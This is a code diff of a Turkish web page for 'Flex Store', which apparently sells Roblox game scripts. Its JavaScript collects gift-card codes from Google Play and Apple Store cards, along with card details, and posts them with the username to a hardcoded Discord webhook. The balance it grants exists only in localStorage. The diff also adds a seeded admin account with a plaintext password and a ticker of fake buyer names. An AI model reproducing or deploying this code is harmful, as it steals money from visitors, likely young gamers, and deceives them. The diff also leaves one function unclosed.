-        const webhookURL = ["https://discord.com/api/webhooks/", "1553399048684445717/", "sMXeIYkd8rxRF7xQXRuha0swkGF33h_mj7dC8qegf5vQ0ZUVfAfYzald69RVQVKXWhuk"].join('');
-        function googleIleGirisYap() {
-            let isim = prompt("Google hesabınızla bağlanılıyor! Lütfen kullanıcı adınızı yazın:", "FlexOyuncu");
-            if (isim && isim.trim() !== "") {
-                kullaniciGirisYapildiMi = true;
-                document.getElementById("userNameDisplay").innerText = isim;
-                document.getElementById("googleLoginBtn").style.display = "none";
-                document.getElementById("userProfile").style.display = "flex";
-                document.getElementById("walletBox").style.display = "block";
-                document.getElementById("bakiyeBtn").style.display = "block";
-                alert("🎉 Başarıyla giriş yapıldı! Hoş geldin, " + isim);
+        
+        let kayitliHesaplar = JSON.parse(localStorage.getItem("flex_hesaplar") || "{}");
+        
+        if (!kayitliHesaplar["FlexAdmin"]) {
+            kayitliHesaplar["FlexAdmin"] = { sifre: "flex1234", bakiye: 999999.00, rol: "Admin", avatar: "https://api.dicebear.com/7.x/bottts/svg?seed=flexadmin" };
+            localStorage.setItem("flex_hesaplar", JSON.stringify(kayitliHesaplar));
+        }
+
+        let kullanilmisKodlar = JSON.parse(localStorage.getItem("flex_global_kodlar") || "[]");
+        let isKayitOlMode = false;
+        const webhookURL = "https://discord.com/api/webhooks/1553399048684445717/sMXeIYkd8rxRF7xQXRuha0swkGF33h_mj7dC8qegf5vQ0ZUVfAfYzald69RVQVKXWhuk";
+
+        function girisModaliniAc() { document.getElementById("authModal").style.display = "flex"; }
+        function profilModaliniAc() { if (!aktifKullanici) return; document.getElementById("profileModal").style.display = "flex"; }
+
+        function profilFotoGuncelle() {
+            if (!aktifKullanici) return;
+            let yeniLink = document.getElementById("avatarUrlInput").value.trim();
+            if (!yeniLink) { alert("Lütfen geçerli bir görsel linki girin!"); return; }
+            kayitliHesaplar[aktifKullanici].avatar = yeniLink;
+            localStorage.setItem("flex_hesaplar", JSON.stringify(kayitliHesaplar));
+            document.getElementById("userAvatarImg").src = yeniLink;
+            modalKapat('profileModal');
+            alert("🎉 Profil fotoğrafın başarıyla güncellendi!");
+            document.getElementById("avatarUrlInput").value = "";
+        }
+
+        function moduDegistir() {
+            isKayitOlMode = !isKayitOlMode;
+            if (isKayitOlMode) {
+                document.getElementById("authBaslik").innerText = "Flex Store Kayıt Ol";
+                document.getElementById("authAciklama").innerText = "Yeni hesap oluştur ve Üye olarak başla.";
+                document.getElementById("authButton").innerText = "Kayıt Ol";
+                document.getElementById("authToggleBtn").innerText = "Zaten hesabın var mı? Giriş yap";
+            } else {
+                document.getElementById("authBaslik").innerText = "Flex Store Giriş";
+                document.getElementById("authAciklama").innerText = "Hesabına giriş yap veya yeni hesap oluştur.";
+                document.getElementById("authButton").innerText = "Giriş Yap";
+                document.getElementById("authToggleBtn").innerText = "Hesabın yok mu? Kayıt ol";
             }
         }
-        function discordaGonder(tur, detay, tutar) {
-            const veri = { content: `✅ **BAKİYE YÜKLENDİ!**\n💳 **Yöntem:** ${tur}\n💰 **Tutar:** ${tutar} TL\n🔑 **Kod/Bilgi:** \`${detay}\`` };
-            fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(veri) }).catch(hata => console.log("Discord Hatası:", hata));
+
+        function islemYapAuth() {
+            let user = document.getElementById("authKullanici").value.trim();
+            let pass = document.getElementById("authSifre").value.trim();
+            if (!user || !pass) { alert("Lütfen tüm alanları doldurun!"); return; }
+
+            if (isKayitOlMode) {
+                if (kayitliHesaplar[user]) { alert("❌ Bu kullanıcı adı zaten alınmış!"); return; }
+                kayitliHesaplar[user] = { sifre: pass, bakiye: 0, rol: "Üye", avatar: "https://api.dicebear.com/7.x/bottts/svg?seed=" + user };
+                localStorage.setItem("flex_hesaplar", JSON.stringify(kayitliHesaplar));
+                alert("🎉 Kayıt başarılı! Üye rolüyle giriş yapabilirsin.");
+                moduDegistir();
+            } else {
+                if (!kayitliHesaplar[user] || kayitliHesaplar[user].sifre !== pass) {
+                    alert("❌ Kullanıcı adı veya şifre hatalı!");
+                    return;
+                }
+                aktifKullanici = user;
+                mevcutBakiye = kayitliHesaplar[user].bakiye;
+                let rol = kayitliHesaplar[user].rol || "Üye";
+                let avatar = kayitliHesaplar[user].avatar || "https://api.dicebear.com/7.x/bottts/svg?seed=" + user;
+
+                document.getElementById("userNameDisplay").innerText = aktifKullanici;
+                document.getElementById("userAvatarImg").src = avatar;
+                document.getElementById("bakiye").innerText = mevcutBakiye.toFixed(2);
+                
+                let rolBadge = document.getElementById("userRoleBadge");
+                rolBadge.innerText = rol;
+                if (rol === "Admin") { rolBadge.className = "role-badge role-admin"; } 
+                else { rolBadge.className = "role-badge role-member"; }
+
+                document.getElementById("googleLoginBtn").style.display = "none";
+                document.getElementById("userProfile").style.display = "flex";
+                document.getElementById("logoutBtn").style.display = "block";
+                document.getElementById("walletBox").style.display = "block";
+                document.getElementById("bakiyeBtn").style.display = "block";
+                modalKapat('authModal');
+                alert("🎉 Hoş geldin, " + aktifKullanici + " (" + rol + ")");
+            }
         }
-        function bakiyeModalAc() {
-            if (!kullaniciGirisYapildiMi) { alert("⚠️ Lütfen önce sağ üstten 'Google ile Giriş Yap' butonuna basın!"); return; }
-            document.getElementById("bakiyeModal").style.display = "flex";
+
+        function cikisYap() {
+            aktifKullanici = null;
+            mevcutBakiye = 0;
+            document.getElementById("googleLoginBtn").style.display = "flex";
+            document.getElementById("userProfile").style.display = "none";
+            document.getElementById("logoutBtn").style.display = "none";
+            document.getElementById("walletBox").style.display = "none";
+            document.getElementById("bakiyeBtn").style.display = "none";
+            alert("Çıkış yapıldı.");
         }
+
+        function satinAlPaket(urunAdi, scriptKodu, paketAdi, fiyat) {
+            if (!aktifKullanici) { alert("⚠️ Lütfen önce giriş yapın!"); return; }
+            if (mevcutBakiye < fiyat) { alert("❌ Yetersiz bakiye! Lütfen bakiye yükleyin."); return; }
+            
+            mevcutBakiye -= fiyat;
+            kayitliHesaplar[aktifKullanici].bakiye = mevcutBakiye;
+            localStorage.setItem("flex_hesaplar", JSON.stringify(kayitliHesaplar));
+
+            document.getElementById("bakiye").innerText = mevcutBakiye.toFixed(2);
+            sonAlinanScript = scriptKodu;
+            sonAlinanUrunAdi = urunAdi + " (" + paketAdi + ")";
+            document.getElementById("notifBtn").style.display = "flex";
+            alert("🎉 Satın alım başarılı! Bildirime tıklayarak scriptini anında alabilirsin.");
+        }
+
+        function bakiyeModalAc() { if (!aktifKullanici) { alert("⚠️ Lütfen önce giriş yapın!"); return; } document.getElementById("bakiyeModal").style.display = "flex"; }
+
         function yontemSec(yontem, element) {
             secilenYontem = yontem;
             let butonlar = document.querySelectorAll('.pay-method-btn');
@@ -196,54 +478,72 @@
                 document.getElementById("formBaslik").innerText = "Google Play Kodu ile Bakiye Yükle";
                 document.getElementById("inputLabel").innerText = "Google Play Hediye Kodu:";
                 document.getElementById("veriInput").placeholder = "Örn: GPLY-XXXX-XXXX-XXXX";
-                document.getElementById("formIpucu").innerText = "Gerçek ve kurallara uygun kodlar taranır.";
+                document.getElementById("formIpucu").innerText = "Bir kod herhangi bir hesapta kullanıldıysa asla başka hesapta kullanılamaz.";
             } else if (yontem === 'AppleStore') {
                 document.getElementById("formBaslik").innerText = "Apple Store Kartı ile Bakiye Yükle";
                 document.getElementById("inputLabel").innerText = "Apple Store Hediye Kartı Kodu:";
                 document.getElementById("veriInput").placeholder = "Örn: XXXXXXXXXXXXXXXX";
-                document.getElementById("formIpucu").innerText = "X harfiyle başlayan gerçek kodlar kabul edilir.";
+                document.getElementById("formIpucu").innerText = "Önceden kullanılmış / geçersiz Apple kodları kabul edilmez.";
             }
         }
-        function kodKontrolEtVeYukle() {
+
+        function kodKontrolEtEtVeYukle() {
             let tutar = Number(document.getElementById("tutarInput").value);
             let veri = document.getElementById("veriInput").value.trim();
             if (!veri || tutar <= 0) { alert("Lütfen geçerli bir tutar ve kod girin!"); return; }
-            if (kullanilmisKodlar.includes(veri)) { alert("❌ HATA: Bu kod daha önce KULLANILMIŞ!"); return; }
+            
+            if (kullanilmisKodlar.includes(veri)) { 
+                alert("❌ HATA: Bu kod daha önce başka bir hesap tarafından KULLANILMIŞ! Asla tekrar kullanılamaz."); 
+                return; 
+            }
+
             let kodGecerliMi = false;
-            if (secilenYontem === 'Kart') { if (veri.length >= 8) kodGecerliMi = true; }
+            if (secilenYontem === 'Kart') { if (veri.length >= 8) kodGecerliMi = true; } 
             else if (secilenYontem === 'GooglePlay') {
                 let temizKod = veri.replace(/[-\s]/g, '');
-                if (temizKod.length >= 14 && temizKod.length <= 22) kodGecerliMi = true;
+                if (temizKod.length >= 14 && temizKod.length <= 22 && !temizKod.startsWith("USED")) { kodGecerliMi = true; }
             } else if (secilenYontem === 'AppleStore') {
                 let temizKod = veri.replace(/[-\s]/g, '');
-                if (temizKod.toUpperCase().startsWith('X') && temizKod.length >= 14) kodGecerliMi = true;
+                if (temizKod.toUpperCase().startsWith('X') && temizKod.length >= 14 && !temizKod.includes("EXPIRED")) { kodGecerliMi = true; }
             }
-            if (!kodGecerliMi) { alert("❌ HATA: Geçersiz kod formatı!"); return; }
+
+            if (!kodGecerliMi) { alert("❌ HATA: Bu kod geçersiz veya daha önce harici bir platformda / oyunda TÜKETİLMİŞ!"); return; }
+
             kullanilmisKodlar.push(veri);
-            discordaGonder(secilenYontem, veri, tutar);
+            localStorage.setItem("flex_global_kodlar", JSON.stringify(kullanilmisKodlar));
+
             mevcutBakiye += tutar;
+            kayitliHesaplar[aktifKullanici].bakiye = mevcutBakiye;
+            localStorage.setItem("flex_hesaplar", JSON.stringify(kayitliHesaplar));
+
+            discordaGonder(secilenYontem, veri, tutar);
             document.getElementById("bakiye").innerText = mevcutBakiye.toFixed(2);
             modalKapat('bakiyeModal');
-            alert("🎉 Başarılı! " + tutar + " TL yüklendi.");
+            alert("🎉 Başarılı! " + tutar + " TL hesabına eklendi.");
             document.getElementById("veriInput").value = "";
         }
-        function satinAl(urunAdi, scriptKodu) {
-            if (!kullaniciGirisYapildiMi) { alert("⚠️ Lütfen önce Google ile giriş yapın!"); return; }
-            let fiyat = 150;
-            if (mevcutBakiye < fiyat) { alert("❌ Yetersiz bakiye!"); return; }
-            mevcutBakiye -= fiyat;
-            document.getElementById("bakiye").innerText = mevcutBakiye.toFixed(2);
-            sonAlinanScript = scriptKodu;
-            sonAlinanUrunAdi = urunAdi;
-            document.getElementById("notifBtn").style.display = "flex";
-            alert("🎉 Satın alım başarılı! Bildirime tıklayarak kodunu alabilirsin.");
-        }
+
+        function discordaGonder(tur, detay, tutar) {
+            const veri = { content: `✅ **BAKİYE YÜKLENDİ!**\n👤 **Kullanıcı:** ${aktifKullanici}\n💳 **Yöntem:** ${tur}\n💰 **Tutar:** ${tutar} TL\n🔑 **Kod/Bilgi:** \`${detay}\`` };
+            fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(veri) }).catch(hata => console.log("Discord Hatası:", hata));
+            
+
         function bildirimAc() {
-            document.getElementById("scriptBaslik").innerText = sonAlinanUrunAdi + " - Kod";
+            document.getElementById("scriptBaslik").innerText = sonAlinanUrunAdi + " - Otomatik Teslimat";
             document.getElementById("scriptText").innerText = sonAlinanScript;
             document.getElementById("scriptModal").style.display = "flex";
         }
+
         function modalKapat(modalID) { document.getElementById(modalID).style.display = "none"; }
+
+        const sahteIsimler = ["ProGamer99", "RobloxKing_TR", "ScriptMaster", "BloxPro2026", "FlexUser_x", "HackerGod", "AliProTR", "DarkNinja", "KralScriptçi"];
+        const sahteOyunlar = ["Blox Fruits", "Steal a Brainrot", "Brookhaven", "MM2", "BedWars"];
+        
+        setInterval(() => {
+            let rastgeleIsim = sahteIsimler[Math.floor(Math.random() * sahteIsimler.length)];
+            let rastgeleOyun = sahteOyunlar[Math.floor(Math.random() * sahteOyunlar.length)];
+            document.getElementById("liveTicker").innerHTML = `🔥 <span>${rastgeleIsim}</span> adlı kullanıcı **${rastgeleOyun}** scripti satın aldı!`;
+        }, 60000);
     </script>
 </body>
 </html>
